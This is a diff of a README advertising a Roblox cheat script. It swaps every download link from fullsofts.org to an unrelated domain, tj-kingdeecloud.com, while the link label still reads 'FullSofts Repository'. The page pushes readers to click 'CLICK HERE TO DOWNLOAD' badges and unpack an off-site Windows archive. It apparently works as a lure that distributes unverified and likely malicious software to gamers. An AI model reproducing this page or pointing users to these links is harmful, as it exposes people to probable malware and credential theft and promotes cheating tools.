@@ -1,8 +1,8 @@
 # 🧠 Steal a Brainrot Roblox Script 2026
 
-[![Download Now](https://img.shields.io/badge/Download-Full_Version-brightgreen?style=for-the-badge&logo=roblox)](https://fullsofts.org/)
-[![Latest Release](https://img.shields.io/badge/Release-2026_Ed.-blue?style=for-the-badge)](https://fullsofts.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-informational?style=for-the-badge&logo=windows)](https://fullsofts.org/)
+[![Download Now](https://img.shields.io/badge/Download-Full_Version-brightgreen?style=for-the-badge&logo=roblox)](https://tj-kingdeecloud.com/)
+[![Latest Release](https://img.shields.io/badge/Release-2026_Ed.-blue?style=for-the-badge)](https://tj-kingdeecloud.com/)
+[![Platform](https://img.shields.io/badge/Platform-Windows-informational?style=for-the-badge&logo=windows)](https://tj-kingdeecloud.com/)
 
 Advanced automation tool for Roblox experience enhancement. This version includes updated mechanisms for 2026 compatibility.
 
@@ -22,7 +22,7 @@ Advanced automation tool for Roblox experience enhancement. This version include
 
 ## 📦 Installation Steps
 
-[![Download Button](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-Important-red?style=for-the-badge&logo=download)](https://fullsofts.org/)
+[![Download Button](https://img.shields.io/badge/CLICK_HERE_TO_DOWNLOAD-Important-red?style=for-the-badge&logo=download)](https://tj-kingdeecloud.com/)
 
 After acquiring the files:
 *   Decompress the archive using any extraction utility
@@ -47,5 +47,5 @@ This software is intended for personal use with appropriate permissions. Verify 
 
 ---
 **Current Version:** 2026 Edition  
-**Source:** [FullSofts Repository](https://fullsofts.org/)  
+**Source:** [FullSofts Repository](https://tj-kingdeecloud.com/)  
 **Access:** Direct download available via button above
